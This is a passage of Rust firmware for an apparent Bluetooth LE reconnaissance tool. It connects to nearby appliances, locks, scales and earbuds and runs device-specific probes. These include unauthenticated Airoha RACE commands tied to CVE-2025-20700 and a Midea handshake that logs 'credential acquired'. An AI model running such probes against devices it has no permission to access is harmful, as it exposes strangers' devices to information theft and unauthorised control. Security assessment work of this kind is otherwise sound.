        // is skipped. The assessment path (`airoha_assess` in this module) and the
        // `device::airoha` module are left intact; re-enable by restoring this branch
        // as `} else if device::airoha::is_race_service(su) {` above.
        //
        // else if device::airoha::is_race_service(su) {
        //     // Airoha RACE service: a write (TX) + notify (RX) pair.
        //     let mut chars: heapless::Vec<Characteristic, MAX_CHARS_PER_SVC> = heapless::Vec::new();
        //     discover_characteristics(conn, svc, &mut chars).await;
        //     let (mut tx, mut rx) = (None, None);
        //     for ci in 0..chars.len() {
        //         let ch = chars[ci];
        //         let r = device::airoha::role(&ch.uuid[..ch.uuid_len as usize]);
        //         let is_tx = r == Some(device::airoha::Role::Tx) || (r.is_none() && ch.props & 0x0C != 0);
        //         let is_rx = r == Some(device::airoha::Role::Rx) || (r.is_none() && ch.props & 0x10 != 0);
        //         if is_tx && tx.is_none() { tx = Some(ch.value_handle); }
        //         if is_rx && rx.is_none() {
        //             rx = Some(ch.value_handle);
        //             enable_cccd(conn, &chars, ci, svc.end).await;
        //         }
        //     }
        //     if let (Some(tx_h), Some(rx_h)) = (tx, rx) {
        //         out.kind = DeviceKind::Airoha;
        //         out.airoha = Some(device::airoha::Profile { tx_h, rx_h });
        //     }
        // }
    }
    out
}

/// Airoha RACE assessment: send the confirmed unauthenticated READ_SDK_VERSION
/// command and await the reply. A well-formed RACE response from a device we never
/// paired with is the CVE-2025-20700 missing-authentication exposure; log it.
async fn airoha_assess(conn: &mut Conn, prof: &device::airoha::Profile) -> bool {
    
    // Unauthenticated info-disclosure probes (CVE-2025-20700). READ_SDK_VERSION is
    // byte-confirmed; GET_BD_ADDRESS is built from the confirmed framing + the
    // reference opcode. Any well-formed RACE reply is the exposure.
    const PROBES: &[(&str, u16)] = &[
        ("READ_SDK_VERSION", device::airoha::CMD_READ_SDK_VERSION),
        ("GET_BD_ADDRESS", device::airoha::CMD_GET_BD_ADDRESS),
    ];
    let mut out = [0u8; ATT_MTU_MAX];
    let mut exposed = false;
    for (name, cmd) in PROBES {
        let Some(req) = device::airoha::build_cmd(*cmd, &[], true) else {
            continue;
        };
        ulogf!("  airoha: RACE {} (unauthenticated probe)\r\n", name);
        if let Some(n) =
            att_write_await_notify(conn, prof.tx_h, &req, prof.rx_h, HS_REPLY_EVENTS, &mut out).await
        {
            if let Some((rcmd, payload)) = device::airoha::parse_reply(&out[..n]) {
                exposed = true;
                let mut s = decoder::LogStr::new();
                let _ = write!(s, "  airoha: {} reply cmd=0x{:04X} EXPOSED payload=", name, rcmd);
                for &b in payload.iter().take(24) {
                    let _ = write!(s, "{:02X}", b);
                }
                decoder::emit(s);
            } else {
                ulogf!("  airoha: {} reply not a RACE frame (len={})\r\n", name, n);
            }
        } else {
            ulogf!("  airoha: {} no reply\r\n", name);
        }
    }
    flash(if exposed { led::GREEN } else { led::YELLOW }, 2);
    exposed
}
/// 16-bit value of a service UUID — the shared extraction is
/// [`crate::device::uuid16`].
fn svc_uuid16(s: &Service) -> Option<u16> {
    device::uuid16(&s.uuid[..s.uuid_len as usize])
}

/// Same 16-bit extraction as [`svc_uuid16`], for a characteristic UUID.
fn char_uuid16(c: &Characteristic) -> Option<u16> {
    device::uuid16(&c.uuid[..c.uuid_len as usize])
}

/// Tear the link down and leave the radio ready for the next cycle.
async fn close(conn: &mut Conn) {
    if conn.ev_addr != 0 {
        terminate(conn).await;
    }
    ensure_disabled();
    configure_ble();
}

/// Probe one device: connect + enumerate, then branch on the control profile —
/// handshake + status listen if FFA1/FFA2 is present, else the subscribe the walk
/// already did — listen up to [`LISTEN_SECS`], and disconnect. Returns the probe
/// and handshake outcomes for the table.
async fn probe_device(rng: &mut Rng, e: &DeviceEntry) -> (ProbeState, DeviceKind, HandshakeState) {
    let a = e.addr;
    let t0 = Instant::now();
    ulogf!(
        "rprobe: addr={:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} hint={} rssi={} connecting\r\n",
        a[5], a[4], a[3], a[2], a[1], a[0], e.kind, e.rssi
    );

    set_phase(Phase::Enumerate);
    let Some((mut conn, cls, services)) = open(rng, e).await else {
        set_phase(Phase::Idle);
        return (ProbeState::ProbeFailed, e.kind, HandshakeState::NoHandshake);
    };
    let kind = cls.kind;

    // If the peer never sent a data-channel packet (`ev_addr == 0`: CONNECT_IND
    // accepted but we never heard back — common when signal is too weak for
    // bidirectional data) or service discovery returned nothing (link lost during
    // enumerate), we got nothing useful from this connection. Treat it as a failed
    // probe so the device stays a candidate next round and is retried — weak-signal
    // devices should not be frozen out of future scans.
    if conn.ev_addr == 0 || services.is_empty() {
        ulogf!("rprobe: link yielded nothing (ev_addr={} services={}) — not tracked\r\n",
            conn.ev_addr, services.len());
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (ProbeState::ProbeFailed, e.kind, HandshakeState::NoHandshake);
    }

    // MiBeacon sensor (XMZNMS08LM door/window, LYWSD03MMC temp/humidity): no
    // control profile, but the GATT walk reads its sensor values (temperature,
    // humidity, battery on the stock LYWSD03MMC). Probe with the walk rather
    // than skipping.
    if e.kind == DeviceKind::Misensor {
        set_phase(Phase::Enumerate);
        let subscribed = mi::probe_sensor(&mut conn, &services).await;
        ulogf!("rprobe: misensor done services={} subs={} in {}ms\r\n",
            services.len(), subscribed, (Instant::now() - t0).as_millis());
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (ProbeState::Probed, kind, HandshakeState::NoHandshake);
    }

    // No known control profile → not a recon target. Full enumerate + listen is the
    // GATT-enum mode's job, so skip it here and disconnect. It still counts as a
    // completed probe (cooldown applies) so we do not reconnect it every round.
    if cls.midea.is_none() && cls.airoha.is_none() && cls.dessmann.is_none() && cls.miscale.is_none() {
        ulogf!("rprobe: {} — no known control profile, skipping\r\n", kind);
        set_phase(Phase::Idle);
        close(&mut conn).await;
        return (ProbeState::Probed, kind, HandshakeState::NoHandshake);
    }

    // Assessment on the fresh link, before the heavy walk — a peer can drop the
    // link during a long enumeration, so the credential/probe comes first.
    let mut stats = midea::HsStats::default();
    let mut hs = None;
    let mut hs_state = HandshakeState::NoHandshake;
    if let Some(prof) = cls.midea {
        set_phase(Phase::Handshake);
        // The probe needs the advert serial (rootKey) + address, recorded in the
        // table when the device was scanned.
        let (sn, addr) = match (e.sn, e.addr) {
            (Some(sn), addr) => (sn, addr),
            _ => {
                set_phase(Phase::Idle);
                return (ProbeState::ProbeFailed, kind, HandshakeState::NoHandshake);
            }
        };
        match midea::probe(&mut conn, &prof, &sn, &addr, &mut stats).await {
            midea::HsOutcome::Complete(h) => hs = Some(h),
            midea::HsOutcome::SecError => hs_state = HandshakeState::Unsupported,
            midea::HsOutcome::NoReply => hs_state = HandshakeState::HandshakeFail,
        }
    } else if let Some(prof) = cls.airoha {
        set_phase(Phase::Handshake);
        hs_state = if airoha_assess(&mut conn, &prof).await {
            HandshakeState::HandshakeSuccessful
        } else {
            HandshakeState::HandshakeFail
        };
    } else if let Some(prof) = cls.dessmann {
        set_phase(Phase::Handshake);
        dessmann::probe(&mut conn, &prof).await;
    } else if let Some(prof) = cls.miscale {
        set_phase(Phase::Handshake);
        mi::probe_scale(&mut conn, &prof).await;
    }

    // Post-handshake walk. Sit-still: the full GATT tree (log everything).
    // On-the-go: targeted walk of only the Midea-protocol services — the same set
    // midea-ble-go probes (FFA0, FF90, Device Info, GAP). Gives the char handles,
    // readable values and subscription state without the 8–14 s cost of a 13-service
    // walk while the device may be walking away.
    set_phase(Phase::Enumerate);
    let subscribed = if PARAMS.full_walk {
        walk_services(&mut conn, &services, |_vh, _uuid| {}).await
    } else if (cls.midea.is_some() && hs.is_none())
        || cls.dessmann.is_some()
        || cls.miscale.is_some()
    {
        // The control profile is already known from classify, and the device just
        // rejected / ignored the handshake (Midea) or is a DESSMANN lock whose
        // channel (FFE9/FFE4) we already probed. Re-walking after a failure or a
        // completed lock probe only burns link time on services that did not
        // answer — the silent-profile burn. Skip it.
        ulogf!("  profile walk skipped (handshake failed / lock probed)\r\n");
        0
    } else {
        let targeted: heapless::Vec<Service, MAX_SERVICES> = services
            .iter()
            .filter(|s| device::midea::is_service(svc_uuid16(s)))
            .copied()
            .collect();
        walk_services(&mut conn, &targeted, |_vh, _uuid| {}).await
    };

    // Report. A handshaked Midea device already got its status via the active
    // status-query probe (sent inside `midea::probe` right after c3), so no
    // passive GATT notification listen runs here; the link is torn down directly.
    set_phase(Phase::Listen);
    if let (Some(_prof), Some(_hsv)) = (cls.midea, hs.as_ref()) {
        flash(led::GREEN, 2); // credential acquired
        hs_state = HandshakeState::HandshakeSuccessful;
        ulogf!("rprobe: midea OK status={} services={} in {}ms\r\n",
            stats.status, services.len(), (Instant::now() - t0).as_millis());
    } else if cls.midea.is_some() {
        flash(led::YELLOW, 2);
        hs_state = HandshakeState::HandshakeFail;
        ulogf!("rprobe: midea handshake FAIL services={} in {}ms\r\n",
            services.len(), (Instant::now() - t0).as_millis());
    } else {
        if subscribed > 0 {
            listen_notifications(&mut conn, LISTEN_EVENTS).await;
        }
        ulogf!("rprobe: {} done services={} subs={} in {}ms\r\n",
            kind, services.len(), subscribed, (Instant::now() - t0).as_millis());
    }

    set_phase(Phase::Idle);
    close(&mut conn).await; // disconnect (terminate if the link was live)
    (ProbeState::Probed, kind, hs_state)
}
